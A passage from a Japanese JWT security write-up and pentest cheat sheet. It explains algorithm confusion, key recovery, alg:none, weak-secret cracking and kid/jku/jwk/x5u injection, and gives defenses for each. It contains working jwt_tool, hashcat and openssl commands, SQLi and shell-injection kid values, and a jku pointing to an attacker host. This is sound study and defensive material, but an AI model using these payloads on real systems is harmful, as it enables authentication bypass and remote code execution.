問題は、多くのJWT検証ライブラリの実装が、「このトークンはどのアルゴリズムで検証すべきか」を**サーバー側の設定ではなく、トークン自身が持つ`alg`ヘッダーの値**に基づいて決定してしまうケースがある点である。つまり、本来サーバーが「このエンドポイントはRS256のトークンしか受け付けない」と固定的に決めておくべきところを、「トークンの`alg`ヘッダーに書かれている方式で検証する」という動的な実装になっていると、攻撃者は自分の都合の良いアルゴリズムをヘッダーに書き込むだけで検証ロジックそのものを乗っ取れてしまう。

この時、攻撃者が`alg`を`HS256`に書き換えると、サーバー側の検証コードは「HMACとして検証せよ」という指示に従い、**検証用の鍵として本来RSAの公開鍵が格納されているはずの変数**をそのままHMACの秘密鍵として使ってしまう。多くのJWTライブラリでは、RS256用の検証関数とHS256用の検証関数が同じ「鍵」というパラメータを受け取る設計になっており、鍵の「型」（公開鍵オブジェクトなのか、生のバイト列なのか）をアルゴリズムに応じて厳密に区別しないことが根本原因である。RSA公開鍵はPEM形式の文字列やDER形式のバイト列として表現できるため、これを「HMACのシークレット文字列」として渡すこと自体はプログラム上エラーにならず、正当な署名として通ってしまう。

### 2. ケースA: 公開鍵が配布されているケース（アルゴリズム混同）

#### 2.1 攻撃対象の前提

このケースでは、サーバーはRS256でJWTに署名しており、`/jwks.json`（JSON Web Key Set、複数の鍵情報をJSON形式でまとめたもの）エンドポイントで検証用の公開鍵を公開している。JWKS は本来、クライアントやリソースサーバーが署名検証に使うために公開鍵を取得する標準的な仕組みであり、OAuthやOpenID Connectのフェデレーション環境などで広く用いられる。問題は、サーバー実装が`alg`ヘッダーの値をトークンごとに動的に信頼してしまう欠陥を持つ点にある。

#### 2.2 攻撃が成立する条件と要素（仕組みの整理）

ライトアップが示すのは、攻撃者が特別な暗号解読を行うのではなく、**「サーバーが検証に使う鍵の実体（＝公開されている公開鍵のバイト列）」と「そのバイト列をHMACのシークレットとして解釈させるアルゴリズム指定」を組み合わせるだけ**で偽造署名が通る、という点である。要素を分解すると次の3つに集約される。

- **鍵の入手**: 検証鍵の実体は`/jwks.json`から誰でも取得できる。攻撃者はこれをRSA公開鍵として得たうえで、HMACのシークレットとして扱える文字列（PEM形式など）に変換する。
- **アルゴリズムのすり替え**: ヘッダーの`alg`を`RS256`から`HS256`に書き換える。これによりサーバーは「HMACとして検証せよ」という指示に従う。
- **鍵の再利用**: 上記の公開鍵由来の文字列をHMACの共有鍵とみなして再署名すると、サーバー側の検証（同じ公開鍵をHMAC鍵として使う）と一致してしまう。

重要なのは、これらのどのステップも「サーバーが本来秘匿すべき情報」を要求していないことである。攻撃の本質は次項の「なぜ成立するのか」にある。

> 出典: JWT authentication bypass via algorithm confusion — siunam's Website — https://siunam321.github.io/ctf/portswigger-labs/JWT/jwt-7/

#### 2.3 なぜこれで管理者になりすませるのか — 仕組みの核心

このトリックが成立する理由は、「サーバーが検証時に使う鍵の**実体（バイト列）**は、公開鍵取得エンドポイントで公開されているものと**完全に一致していなければならない**」という点にある。出典記事はこの点を次のように強調している。

> "The version of the key that you use to sign the JWT must be identical to the server's local copy... every single byte must match."（JWTの署名に使う鍵のバージョンは、サーバー側のローカルコピーと同一でなければならない。1バイトたりとも違えばならない。）

つまり攻撃者は、サーバーの検証ロジックを騙しているのではなく、**サーバーが検証時に参照する鍵の値そのものを正確に知っている**状態を作り出し、そのうえで「アルゴリズムの解釈」だけをRS256からHS256にすり替えている。サーバー側の擬似コードに近い実装は概ね次のような形になりやすい。

```
function verify(token, key):
    header = decodeHeader(token)
    if header.alg == "HS256":
        return hmacVerify(token, key)   # keyをバイト列として使う
    elif header.alg == "RS256":
        return rsaVerify(token, key)    # keyを公開鍵オブジェクトとして使う
```

この実装では、`key`という同一の変数（サーバーが保持する公開鍵）が、`alg`ヘッダーの値次第で「HMACの共有シークレット」としても「RSA検証用の公開鍵」としても解釈されてしまう。RSAの公開鍵は元来「漏洩しても安全」という前提の情報であるため、サーバーはそれを気軽に`/jwks.json`で公開している。しかし、その「公開されて安全なはずの値」が、アルゴリズムの選び方次第でHMACの「秘密であるべき」共有鍵としても通用してしまうという、設計思想の異なる2つのアルゴリズムを同じ鍵変数に対して切り替え可能にしてしまったことが、脆弱性の本質である。

### 3. ケースB: 公開鍵が配布されていないケース（No Exposed Key）

#### 3.1 難易度が上がる理由

ケースAと異なり、このケースのサーバーは`.well-known/jwks.json`や`/jwks.json`のような公開鍵配布エンドポイントを持たない。したがって、攻撃者は「サーバーの検証鍵と1バイトも違わない値」を、正規の配布経路からは入手できない。ここで用いられるのが、**複数の正規JWT（署名済みトークン）から数学的に公開鍵を復元する**という手法である。

#### 3.2 公開鍵の数学的復元 — sig2n

RSA署名の検証は、署名値を公開指数`e`でべき乗し、法`n`（モジュラス、2つの大きな素数の積）で剰余を取ることで行われる。同一の秘密鍵によって生成された複数の署名（＝異なるメッセージに対する署名値のペア）があれば、RSAの数論的性質を用いて、法`n`を計算的に導出できる場合がある。この原理を実装したツールがPortSwigger製の`sig2n`である。

ライトアップが示す流れを仕組みの観点で整理すると、次の要素からなる。まず、同一の秘密鍵で署名された正規JWTを**2本**入手する（正常なログイン等で得られる有効な署名付きトークンで足りる）。次に、その2本を`sig2n`のようなツールに与えると、RSAのモジュラス`n`（および公開指数`e`）を計算し、候補となる公開鍵を複数出力する。あとはケースAと同じで、得られた公開鍵をHMACの共有鍵とみなし、`alg`を`HS256`に書き換えて再署名する――候補が複数ある場合、検証を通す鍵は一意に定まる。要点は、**鍵配布エンドポイントを塞いでも、同一鍵の署名済みトークンが2本手に入れば鍵の実体を復元できてしまう**ことにある。

> 出典: JWT authentication bypass via algorithm confusion with no exposed key — siunam's Website — https://siunam321.github.io/ctf/portswigger-labs/JWT/jwt-8/

#### 3.3 なぜ2本の署名から鍵を導出できるのか（原理の補足）

（以下は未取得資料の補足として一般知識に基づく解説です）出典記事自体は「sig2nを実行して鍵を得る」という手順を示すのみで、内部の数学的な導出過程までは踏み込んでいない。背景にある考え方を補足すると、RSA署名検証はおおむね`signature^e mod n = hash(message)`という関係を満たす。異なる2つのメッセージ・署名ペアが同じ`n`のもとで得られている場合、両者の関係式から`n`の倍数となる値を作り出し、最大公約数（GCD）計算によって`n`自体、あるいはその素因数を絞り込めるケースがある。これは「同じ鍵で複数回署名されたデータが手に入る」という状況自体が、本来秘匿すべき鍵の情報を漏洩させうることを示している。実務上の教訓は、JWTの検証鍵を「公開しているかどうか」だけで安全性を判断してはならず、**同一鍵で生成された署名済みトークンを複数収集できる状況自体が、鍵復元の攻撃面になりうる**という点である。

#### 3.4 ケースAとケースBの関係整理

両者の違いは「鍵の入手経路」だけであり、鍵さえ手に入れば以降のアルゴリズム混同の仕組み（`alg`をHS256に変更し、鍵をHMACシークレットとして再署名する）は完全に共通している。つまり、`/jwks.json`のような鍵配布エンドポイントを塞いでいたとしても、サーバーが十分な数の署名済みトークンを外部に露出させ続ける限り、数学的な鍵復元という迂回路が残る。「公開鍵を配布していないから安全」という判断が成り立たないことを、ケースBは示している。

- **署名が全く検証されないケース（unverified signature）**: サーバーが署名検証処理自体を実装しておらず、ペイロードの内容だけを信頼してしまう。攻撃者は署名部分を空や任意の値に書き換えるだけで、クレームを自由に改ざんできる。もっとも根本的な実装ミスであり、JWTライブラリの「検証」関数と「デコードのみ」の関数を取り違えて使っていることが典型的な原因である。
- **`alg`を`none`に変更するケース（フローが欠陥のある署名検証）**: JWT仕様は署名アルゴリズムとして`none`（署名なし）を許容しており、一部のライブラリはこれをデフォルトで受理してしまう。攻撃者は`alg`ヘッダーを`none`に書き換え、署名部分を空にすることで、署名なしのトークンをサーバーに受理させる。
- **`jku`ヘッダーインジェクション**: `jku`（JWK Set URL）ヘッダーは、「この鍵セットをこのURLから取得して検証に使ってください」とトークン自身が指定できる仕組みである。サーバーがこのURLの取得元ドメインを検証しないと、攻撃者は自分が管理するサーバー上にJWK Setを用意し、そのURLを`jku`に指定したうえで、対応する秘密鍵で自由に署名したトークンを送りつけられる。サーバーは指定されたURLから鍵を取得し、それを使って「正しく」検証してしまう。
- **`jwk`ヘッダーインジェクション**: `jku`のようにURLを介さず、検証用の公開鍵そのものをJWTのヘッダー内（`jwk`パラメータ）に直接埋め込める実装の欠陥を突く手口である。サーバーが「ヘッダーに書かれた鍵を信頼して検証に使う」実装になっていると、攻撃者は自分の秘密鍵で署名したうえで、対応する公開鍵を`jwk`ヘッダーに同梱するだけで、任意の内容のトークンを正当なものとして通せる。
- **`kid`ヘッダーのパストラバーサル**: `kid`（Key ID）ヘッダーは、複数の鍵を管理するサーバーが「どの鍵を使って検証すべきか」を示すための識別子である。サーバーがこの値をファイルパスの一部として使い、ファイルシステムから鍵を読み込むような実装になっていると、`kid`にパストラバーサル文字列（`../../dev/null`など）を注入することで、内容が空、あるいは既知のファイルを「鍵」として読み込ませ、既知の値で署名したトークンを通せてしまう場合がある。
- **弱い署名鍵（weak signing key）**: HS256の共有シークレットが`secret`や`password`のような推測しやすい文字列であるケースでは、既知の弱いシークレット一覧（ワードリスト）を使ってオフラインでブルートフォースし、正しいシークレットを特定できる。特定後は、そのシークレットで任意のクレームを持つトークンに正規の署名を付けられる。

これらの手口に共通する原理は、いずれも「JWTの検証ロジックが、トークン自身に含まれる情報（`alg`、`jku`、`jwk`、`kid`など）を過度に信頼し、サーバー側で固定的・独立に管理すべき検証パラメータ（使用するアルゴリズム、鍵の取得元、鍵の実体）を、攻撃者が制御可能な入力に委ねてしまっている」という点に集約される。

### 5. 防御策のまとめ

本節で扱った攻撃はいずれも、実在するサービスや本番環境に対して無許可で検証してよいものではない。防御側の実装指針として押さえるべき原則は次の通りである。

- **アルゴリズムをサーバー側で固定する**: JWTライブラリの検証関数を呼び出す際、トークンのヘッダーに書かれた`alg`を信用せず、「このエンドポイントはRS256のみを受理する」といった形で、期待するアルゴリズムを明示的に指定する。多くの現代的なJWTライブラリ（例: `jose`系ライブラリの新しいバージョン）は、検証時に許容アルゴリズムのホワイトリストを必須引数として要求するAPI設計に移行している。
- **鍵の型とアルゴリズムファミリーを一致させる**: 対称鍵（HMAC用）と非対称鍵（RSA/ECDSA用）を同じ変数・同じストレージで管理しない。ライブラリ側でも、鍵オブジェクトの型（公開鍵オブジェクトか、生のバイト列か）とアルゴリズムの整合性を強制する実装が望ましい。
- **`jku`/`jwk`ヘッダーをそのまま信頼しない**: `jku`で指定される取得先URLは、事前に許可したドメイン・ホストのみに制限する（許可リスト方式）。`jwk`ヘッダーに埋め込まれた鍵をそのまま検証に使う実装は避ける。
- **`kid`を鍵ストレージへの直接的なパス指定に使わない**: `kid`は識別子（ルックアップキー）としてのみ扱い、ファイルパスの構築に生の値を連結しない。
- **署名鍵の強度を確保する**: HMACの共有シークレットには、十分な長さとエントロピーを持つランダム値を用い、辞書攻撃で破られる文字列を避ける。
- **鍵の露出面を最小化する**: 公開鍵配布エンドポイント自体は仕様上問題ないが、同一鍵で生成された署名済みトークンが大量かつ長期間にわたって外部から観測可能な状態を放置しないなど、鍵復元攻撃の材料を不必要に増やさない設計を心がける。

これらの原則は、いずれも「トークンという攻撃者が完全に制御できる入力から、検証プロセスの前提となるパラメータ（アルゴリズム、鍵の取得元、鍵の実体）を切り離す」という一点に集約される。

## JWTチートシート・リファレンス

本節は、JWT（JSON Web Token）に対する代表的な攻撃手法を、実務で即座に参照できる形にまとめたチートシートである。前節までで扱った個々の脆弱性クラス（alg混同、鍵漏洩、ヘッダインジェクションなど）の要点を横断的に整理し、ペネトレーションテストや脆弱性診断の現場で使う具体的なコマンド・ペイロード・判定基準を提供する。読者はJWTの基本構造（`header.payload.signature` の3パートをBase64urlエンコードしたもの）と署名検証の原理はすでに理解している前提で進める。

### JWTの構造とヘッダパラメータが攻撃面になる理由

JWTの`header`には、署名検証に使う鍵をどう特定・取得するかを指示するパラメータが複数存在する。これらは本来「検証者が鍵を見つけるためのヒント」だが、攻撃者がJWTの中身（ヘッダ含む）を自由に書き換えられる以上、**検証ロジックが「ヘッダの指示に従って鍵を探しに行く」設計になっていると、攻撃者は自分の用意した鍵を検証させることができる**。これがJWT攻撃全般の根本原理である。

代表的なヘッダパラメータ:

| パラメータ | 意味 | 悪用の要点 |
|---|---|---|
| `alg` | 署名アルゴリズム | `none`への変更、非対称→対称の混同 |
| `kid` | Key ID（鍵を検索するための識別子） | パストラバーサル、SQLi、コマンドインジェクション |
| `jku` | JWK Set URL（鍵集合を取得するURL） | 攻撃者ホストへのリダイレクト（SSRF的性質） |
| `jwk` | 鍵そのものをヘッダに埋め込む | 攻撃者が生成した公開鍵をそのまま埋め込み検証させる |
| `x5u` / `x5c` | X.509証明書のURL／埋め込み証明書 | 自己署名証明書のなりすまし |

> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

### 1. `alg: none` 攻撃（CVE-2015-9235）

JWT仕様（RFC 7519 / JWS）は署名なしトークンを表現する `"alg": "none"` を許容している。実装が「`alg`ヘッダの値をそのまま信用して検証方式を切り替える」設計だと、攻撃者はヘッダを書き換えるだけで署名検証を完全にスキップさせられる。

**なぜ通るのか**: 多くのJWTライブラリは「ヘッダに書かれたアルゴリズムで検証する」実装になっており、サーバー側が期待するアルゴリズムをホワイトリストで固定していない場合、攻撃者の指定した`none`がそのまま使われてしまう。大文字小文字を変えた `None` / `NONE` / `nOnE` などのバリアントで大文字小文字を区別しない実装のバイパスを試すのも定石である。

```python
import jwt
decodedToken = jwt.decode(jwtToken, verify=False)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
print(noneEncoded.decode())
```

jwt_tool（ticarpi/jwt_tool）を使う場合:

```bash
python3 jwt_tool.py [JWT_HERE] -X a
```

**防御**: 検証ロジックでアルゴリズムをサーバー側の固定値（ホワイトリスト）に限定し、ヘッダの`alg`値を検証方式の選択に使わない。ほとんどのモダンなJWTライブラリ（PyJWT、jjwt等）は近年のバージョンで`none`をデフォルト拒否するが、古いバージョンや自前実装では依然としてリスクがある。

### 2. アルゴリズム混同攻撃 RS256→HS256（CVE-2016-5431 / CVE-2016-10555）

RS256（RSA非対称署名）を使うサーバーが、HS256（HMAC対称署名）を使ったトークンを受け取った際に、**RSAの公開鍵をそのままHMACの共有秘密鍵として使って検証してしまう**実装バグ。公開鍵は名前の通り公開情報のため、攻撃者はこれを入手すればHMAC署名を自分で計算でき、任意のペイロードを持つ「正当な」署名付きトークンを偽造できる。

**なぜ起こるのか（仕組みレベル）**: 多くのJWT検証ライブラリのAPIは「鍵（key）」という1つの引数しか取らず、その鍵をRS256の公開鍵として使うかHS256の共有鍵として使うかを、**トークン側が指定した`alg`ヘッダに従って決める**実装になっていることがある。つまり「鍵の種類（公開鍵か秘密鍵か）」と「アルゴリズムの種類（非対称か対称か）」を紐付けずに、ヘッダの自己申告を信用してしまう設計ミスが原因である。攻撃者が`alg`を`HS256`に書き換え、公開鍵を使ってHMAC署名すれば、サーバーは「同じ公開鍵文字列」をHMACの鍵として使って検証するため署名が一致してしまう。

**手順**:

1. サーバーの公開鍵を取得する（TLS証明書から抽出できる場合が多い）:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

2. PEMをHMAC鍵として使うためhex化する:

```bash
cat pubkey.pem | xxd -p | tr -d "\n"
```

3. `alg`を`HS256`に変更したヘッダとペイロードでHMAC-SHA256署名を計算する:

```bash
echo -n "[HEADER].[PAYLOAD]" | openssl dgst -sha256 -mac HMAC -macopt hexkey:[HEX_KEY]
```

4. 署名をhexからBase64urlに変換し、`header.payload.signature`として結合する:

```python
python2 -c "import base64, binascii; print base64.urlsafe_b64encode(binascii.a2b_hex('[HEX_SIG]')).replace('=','')"
```

jwt_toolでの自動化:

```bash
python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
```

Burp Suiteを使う場合は「JWT Editor」拡張の「HMAC Key Confusion Attack」機能で、公開鍵PEMを与えるだけで同等の攻撃を自動生成できる。

**防御**: 検証時に「このトークンはRS256で検証されるべきもの」というアプリケーション側の期待値を固定し、トークンヘッダの`alg`値によって検証アルゴリズムを切り替えない。ライブラリのAPIとして「鍵と許可アルゴリズムのペア」を明示的に渡せるものを使う（例: PyJWTの`algorithms=["RS256"]`引数を必ず指定する）。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

### 3. 署名検証バイパスのバリエーション

#### 3.1 Null署名攻撃（CVE-2020-28042）

HS256ヘッダを維持したまま、署名部分を完全に空にして送信する:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

一部の実装は「署名が空文字列の場合に検証関数が例外を投げず、誤って真を返す」実装バグを持つ。jwt_toolでは:

```bash
python3 jwt_tool.py JWT_HERE -X n
```

#### 3.2 署名バイト反転による検証ロジック確認

署名部分の1バイトだけを変更して送信し、サーバーがリクエストを受理するかどうかを見る。受理された場合、そもそも署名検証が実装されていない（または無効化されている）ことが分かる。これは攻撃そのものというより、他の攻撃を試す前の「検証有無の切り分け」に使う手法である。

#### 3.3 署名漏洩によるエラーメッセージ（CVE-2019-7644）

不正な署名を送信した際、エラーレスポンスに「期待される署名値」がそのまま含まれてしまう実装が存在する:

```
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got [ATTACKER_SIG]
```

これは典型的な「詳細すぎるエラーメッセージによる情報漏洩」で、攻撃者は正しい署名をそのまま使い回せる。

#### 3.4 RS256公開鍵の復元

RS256/RS384/RS512はPKCS#1 v1.5パディングを使うため、**同じ鍵ペアで署名された異なる2つのメッセージと署名のペアがあれば、公開鍵を数学的に復元できる**場合がある。SecuraBVのjws2pubkeyツールが実装を提供している:

```bash
docker run -it ttervoort/jws2pubkey JWS1 JWS2
```

公開鍵が非公開のシステムで、複数のトークンを傍受できた場合に有効な攻撃手法である。

### 4. 弱い共有鍵のブルートフォース（HS256）

HS256はHMAC-SHA256を使う対称鍵方式であり、鍵の強度がそのままセキュリティ強度になる。開発時のデフォルト値（`secret`、`your_jwt_secret`、`change_this_super_secret_random_string`等）がそのまま本番に残っているケースは頻出する。

**jwt_toolによる辞書攻撃**:

```bash
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py [JWT] -d /tmp/wordlist -C
```

**hashcat**（モードは`16500`＝JWT-HS256）:

```bash
# 辞書攻撃
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# ルールベース（変形パターンを加える）
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# 総当たり（文字種・桁数を指定）
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

wallarm/jwt-secretsは3,502件の頻出JWT秘密鍵を集めた専用ワードリストであり、hashcat/jwt_toolの`-d`オプションにそのまま投入できる。C実装の`c-jwt-cracker`（brendan-rius）はCPU/GPUベースで高速に総当たりを行える。

**鍵発見後の再署名**: jwt_toolの対話メニューから「Sign token with known key」を選び、発見した秘密鍵とアルゴリズム（HS256/384/512）を指定すれば、任意のペイロードを持つ正当な署名付きトークンを生成できる。これは単に鍵を割ることがゴールではなく、**鍵を割った後に任意の権限を持つトークンを偽造できる**点が実害である。

**漏洩情報からの鍵再構築**: 設定ファイルやDBレコードが別経路で漏洩している場合、それらから署名鍵を導出できるケースもある。たとえば暗号化キーの一部をハッシュ化して流用しているような実装では:

```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

このように、他の脆弱性（設定漏洩、SQLi等）とJWT解析を組み合わせることで鍵を再構築できる場合がある点に注意する。

**防御**: HMAC鍵は最低256ビット相当のランダムなエントロピーを持つ値を使用し、環境変数やシークレットマネージャで安全に管理する。可能であれば非対称アルゴリズム（RS256/ES256）へ移行し、署名鍵と検証鍵を分離する。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

### 5. `kid`（Key ID）ヘッダの悪用

`kid`はサーバーが複数の鍵の中からどれを使うかを識別するための識別子で、多くの実装は「`kid`の値をファイルパスやDBクエリのキーとしてそのまま使う」。ここに**入力値検証なしの外部入力（`kid`）→ ファイル読み込み/DB検索という危険な処理（sink）**が生まれ、パストラバーサル・SQLi・コマンドインジェクションの温床になる。

#### 5.1 ローカルファイルパス注入

`kid`にファイルパスを指定し、サーバーがそのパスの内容を鍵として読み込んでしまう実装を狙う:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/root/res/keys/secret.key"
}
```

攻撃者が中身を予測できるファイル（例: `/dev/null`は常に空、既知のログファイルや静的CSS/JSファイルなど内容が既知のもの）を指すことで、その内容をHMAC鍵として使って署名を偽造できる。

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

`-p`には「そのファイルの既知の中身」を鍵として指定する。`/proc/sys/kernel/randomize_va_space`はLinux上でほぼ確実に`0`/`1`/`2`のいずれかであり、既知の内容を持つファイルとして悪用されることがある例として挙げられている。

**なぜ有効か**: HS256の署名検証は「鍵の中身のバイト列」さえ一致すれば成立する。`kid`で指定したファイルパスの読み込み結果がそのまま鍵になる実装であれば、攻撃者はファイルの中身さえ分かれば（あるいは空にできれば）、その鍵で有効な署名を計算できてしまう。

#### 5.2 SQLインジェクション

`kid`の値がDBクエリに直接連結される実装では、SQLiによって「攻撃者が指定した任意の文字列」を鍵として返させることができる:

```
non-existent-index' UNION SELECT 'ATTACKER';-- -
```

このペイロードにより、DBは`kid`検索がヒットしなかった場合でも`UNION SELECT`で強制的に`ATTACKER`という文字列を返す。攻撃者はこの既知の文字列（`ATTACKER`）をHMAC鍵として使い、署名を計算すればよい。

```bash
python3 jwt_tool.py -t https://target.com -rc "jwt=[JWT]" -I -hc kid -hv custom_sqli_vectors.txt
```

#### 5.3 OSコマンドインジェクション

`kid`の値がシェルコマンドの引数として渡される実装（例: `openssl`コマンドの鍵ファイル引数など）では、コマンドインジェクションによってRCE（リモートコード実行）に直結する:

```
key.crt; whoami && python -m SimpleHTTPServer 1337 &
```

または

```
/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&
```

これは「署名偽造」の域を超え、サーバー上でのコマンド実行につながる重大な脆弱性であり、`kid`パラメータを外部コマンドの入力に使う実装は特に注意が必要である。

**防御**: `kid`の値は事前定義されたホワイトリスト（許可された鍵IDの集合）と照合し、それ以外は拒否する。ファイルパスやSQLクエリ、シェルコマンドの構築に`kid`の値を直接連結しない。

> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

### 6. `jwk` ヘッダインジェクション（埋め込み公開鍵、CVE-2018-0114）

JWSヘッダには、検証用の鍵そのものをJSON形式で埋め込める`jwk`パラメータが存在する。実装が「ヘッダに`jwk`があれば、それを検証鍵として無条件に使う」設計だと、**攻撃者は自分で生成した鍵ペアの公開鍵をヘッダに埋め込み、対応する秘密鍵で署名するだけで「正当な」トークンを作れてしまう**。署名検証自体は正しく行われるが、そもそも「どの鍵を信用するか」という信頼の起点が攻撃者に明け渡されている点が本質的な欠陥である。

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "[PUBLIC_KEY_COMPONENTS]"
  }
}
```

jwt_toolでの自動化:

```bash
python3 jwt_tool.py [JWT_HERE] -X i
```

Burp Suite「JWT Editor」拡張での手順:
1. 新しいRSA鍵を生成する
2. Repeaterでリクエスト中のJWTを編集する
3. 「Attack」メニューから「Embedded JWK」を選択する（拡張が自動的にヘッダへの鍵埋め込みと再署名を行う）

**防御**: 検証ロジックはサーバー側で管理する鍵ストアのみを信頼し、トークン自身が持ち込む鍵情報（`jwk`）を検証に使わない。

### 7. `jku`（JWK Set URL）ヘッダインジェクション

`jku`は「この鍵集合（JWKS: JSON Web Key Set）をこのURLから取得せよ」とサーバーに指示するパラメータである。検証者がこのURLへ実際にHTTPリクエストを送って鍵を取得する実装の場合、**`jku`を攻撃者が制御するURLに書き換えることで、サーバーに攻撃者のJWKSを取得・信用させられる**。これは実質的にSSRF（Server-Side Request Forgery、サーバーに攻撃者指定先へのリクエストを強制させる脆弱性）と同じ構造を持つ。

典型的なJWKSエンドポイントのパス例（探索時の参考）:
- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/{tenant}/oauth2/v1/certs`

**攻撃手順**:

1. RSA鍵ペアを生成する:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
```

2. 公開鍵から`n`（modulus）・`e`（exponent）パラメータを抽出し、以下のようなJWKS JSONを構築して攻撃者が管理するサーバーにホストする:

```json
{
  "keys": [
    {
      "kid": "attacker-key-id",
      "kty": "RSA",
      "e": "AQAB",
      "n": "[ATTACKER_PUBLIC_KEY_N]"
    }
  ]
}
```

3. トークンヘッダの`jku`を攻撃者のJWKS URLに書き換え、`kid`をJWKS内の鍵IDと一致させる。

4. 秘密鍵でペイロードに署名する。

jwt_toolでの自動化:

```bash
python3 jwt_tool.py JWT_HERE -X s
python3 jwt_tool.py JWT_HERE -X s -ju http://attacker.com/jwks.json
```

Burp「JWT Editor」拡張の手順:
1. 新しいRSA鍵を生成
2. 自分でJWKSエンドポイントをホスト
3. JWTペイロードを編集
4. `kid`をホストしたJWKS内の値に置き換え
5. `jku`ヘッダを追加し（「modify header」のチェックを外した状態で）署名

**攻撃検知のコツ**: 診断時はBurp Collaboratorなど、外部からのHTTPコールバックを検知できるサービスのURLを一時的に`jku`へ入れて送信し、サーバーからのアクセスが実際に発生するかを確認すると、リモート鍵取得が実装されているかどうかを安全に切り分けられる。

**防御**: `jku`から取得する鍵集合のホストをホワイトリストで固定し、外部URLからの動的な鍵取得を許可しない。可能であれば`jku`自体を無効化し、鍵はサーバー側の静的な設定として管理する。

> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

### 8. `x5u` / `x5c` 証明書パラメータの悪用

`x5u`は`jku`のX.509証明書版で、「検証に使う証明書をこのURLから取得せよ」と指示する。`x5c`はその証明書自体をBase64エンコードしてヘッダに直接埋め込む方式である。原理は`jku`/`jwk`とまったく同じで、**検証者が信頼の起点（鍵・証明書）を外部入力から取得してしまう**ことが問題の核心である。

**x5u攻撃（URLベース）**:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
```

生成した自己署名証明書を`http://attacker.com/attacker.crt`のようなURLでホストし、トークンの`x5u`ヘッダをそのURLに書き換える。サーバーが自己署名証明書を無条件に信頼して取得・検証してしまう実装であれば攻撃が成立する。

**x5c攻撃（埋め込みベース）**:

証明書内容（`-----BEGIN CERTIFICATE-----`等のマーカーを除いた部分）をBase64配列としてヘッダに直接埋め込む:

```json
{
  "alg": "RS256",
  "x5c": ["[BASE64_ENCODED_CERTIFICATE]"]
}
```

modulus（`n`）・exponent（`e`）パラメータの変換例:

```bash
echo "MODULE_VALUE" | base64 | tr '\n' ' ' | sed 's/ //g'
```

**防御**: `x5u`から取得する証明書のCA（認証局）チェーンを信頼済みルート証明書まで検証し、自己署名証明書を無条件に受理しない。`x5c`で埋め込まれた証明書についても同様にチェーン検証を行う。

### 9. ペイロードクレームの改ざん

署名検証自体をバイパスできなくても、有効な鍵を入手済み（あるいは検証がそもそも甘い）場合、ペイロード中のクレームを書き換えるだけで権限昇格や認証バイパスが可能になることがある。

| クレーム | 悪用パターン |
|---|---|
| `exp`（有効期限） | 極端に未来の値に書き換えて無期限化。仕様上は秒単位のUnixタイムスタンプである点に注意（ミリ秒と誤解した実装は誤動作しやすい） |
| `nbf`（Not Before） | `0`など過去の値にして即時有効化 |
| `jti`（JWT ID） | 失効リスト・リプレイ対策の一意識別子を書き換えてブロックリストを回避 |
| `iss`/`aud`（発行者／対象者） | 別サービス向けに発行されたトークンを別サービスへ転用（クロスサービスのトークン使い回し） |

```bash
python3 jwt_tool.py JWT_HERE -I -pc exp -pv 9999999999
python3 jwt_tool.py JWT_HERE -I -pc nbf -pv 0
```

`-pc`（payload claim）で対象クレーム、`-pv`（payload value）で新しい値を指定する。

実務上のコツとして、UUID等の推測不能なパラメータを操作しようとして行き詰まった場合、**そのパラメータを空文字列にしてみる**ことで検証ロジックの想定外の分岐（デフォルト値やnullチェック漏れ）を突けることがある。

**防御**: `exp`/`nbf`の妥当性をサーバー時刻と照合して厳密に検証し、`iss`/`aud`をアプリケーションごとに固定値でチェックする。重要な操作を伴うトークンには`jti`を発行し、使用済みトークンをサーバー側で追跡・失効できる仕組み（denylist/allowlist）を用意する。

> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

### 10. 診断ワークフローの実践手順

3資料に共通する、実際の診断で使える手順をまとめる。

